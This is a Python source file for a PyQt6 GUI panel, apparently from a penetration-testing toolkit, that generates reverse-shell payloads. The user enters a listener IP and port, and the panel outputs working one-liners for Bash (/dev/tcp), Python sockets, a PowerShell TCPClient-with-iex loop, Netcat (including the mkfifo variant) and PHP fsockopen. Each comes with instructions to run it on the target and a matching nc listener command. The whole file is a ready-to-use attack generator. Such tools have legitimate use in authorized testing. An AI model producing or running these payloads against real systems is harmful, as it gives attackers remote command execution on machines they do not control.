# app/components/scripts/reverse_shells_component.py
from PyQt6.QtWidgets import QWidget, QVBoxLayout, QHBoxLayout, QFrame, QLabel, QLineEdit, QPushButton, QTextEdit
from PyQt6.QtCore import pyqtSignal

class ReverseShellsComponent(QWidget):
    status_updated = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()

    def setup_ui(self):
        layout = QHBoxLayout(self)
        
        # Left panel - controls
        left_panel = QFrame()
        left_panel.setFixedWidth(200)
        left_layout = QVBoxLayout(left_panel)
        
        self.lhost_input = QLineEdit()
        self.lhost_input.setPlaceholderText("Your IP address")
        left_layout.addWidget(QLabel("LHOST:"))
        left_layout.addWidget(self.lhost_input)
        
        self.lport_input = QLineEdit()
        self.lport_input.setText("4444")
        self.lport_input.setPlaceholderText("4444")
        left_layout.addWidget(QLabel("LPORT:"))
        left_layout.addWidget(self.lport_input)
        
        left_layout.addWidget(QLabel("Shell Types:"))
        
        buttons = [
            ("Bash", self.generate_bash_shell),
            ("Python", self.generate_python_shell),
            ("PowerShell", self.generate_powershell),
            ("Netcat", self.generate_netcat_shell),
            ("PHP", self.generate_php_shell)
        ]
        
        for text, method in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(method)
            btn.setMinimumHeight(35)
            left_layout.addWidget(btn)
        
        left_layout.addStretch()
        
        # Right panel - output
        right_panel = QFrame()
        right_layout = QVBoxLayout(right_panel)
        
        self.shell_output = QTextEdit()
        self.shell_output.setReadOnly(True)
        self.shell_output.setPlaceholderText("Generated reverse shells will appear here...")
        right_layout.addWidget(self.shell_output)
        
        layout.addWidget(left_panel)
        layout.addWidget(right_panel)

    def generate_bash_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        from app.core.html_utils import h
        bash_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Bash Reverse Shell</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0;'>
        {h(bash_shell)}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> Execute on target system<br>
        <b>Listener:</b> nc -lvnp {h(lport)}
        </div>
        """)

    def generate_python_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        from app.core.html_utils import h
        python_shell = f"""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);"""
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Python Reverse Shell</div>
        <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {h(python_shell)}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> python -c "exec above code"<br>
        <b>Listener:</b> nc -lvnp {h(lport)}
        </div>
        """)

    def generate_powershell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        from app.core.html_utils import h
        ps_shell = f"""$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>PowerShell Reverse Shell</div>
        <div style='color: #00FF41; font-size: 11pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {h(ps_shell)}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> powershell -c "exec above code"<br>
        <b>Listener:</b> nc -lvnp {h(lport)}
        </div>
        """)

    def generate_netcat_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        from app.core.html_utils import h
        nc_shell = f"nc -e /bin/sh {lhost} {lport}"
        nc_shell_alt = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>Netcat Reverse Shell</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0;'>
        {h(nc_shell)}
        </div>
        <div style='color: #FFFF00; font-size: 12pt;'>Alternative (if -e not available):</div>
        <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {h(nc_shell_alt)}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Listener:</b> nc -lvnp {h(lport)}
        </div>
        """)

    def generate_php_shell(self):
        lhost = self.lhost_input.text().strip()
        lport = self.lport_input.text().strip() or "4444"
        if not lhost:
            self.shell_output.setHtml("<p style='color: #FF4500;'>[ERROR] Please enter LHOST</p>")
            return
        from app.core.html_utils import h
        php_shell = f"""php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");'"""
        self.shell_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 16pt; font-weight: bold;'>PHP Reverse Shell</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 10px; margin: 10px 0; word-wrap: break-word;'>
        {h(php_shell)}
        </div>
        <div style='color: #DCDCDC; font-size: 12pt;'>
        <b>Usage:</b> Execute on target with PHP installed<br>
        <b>Listener:</b> nc -lvnp {h(lport)}
        </div>
        """)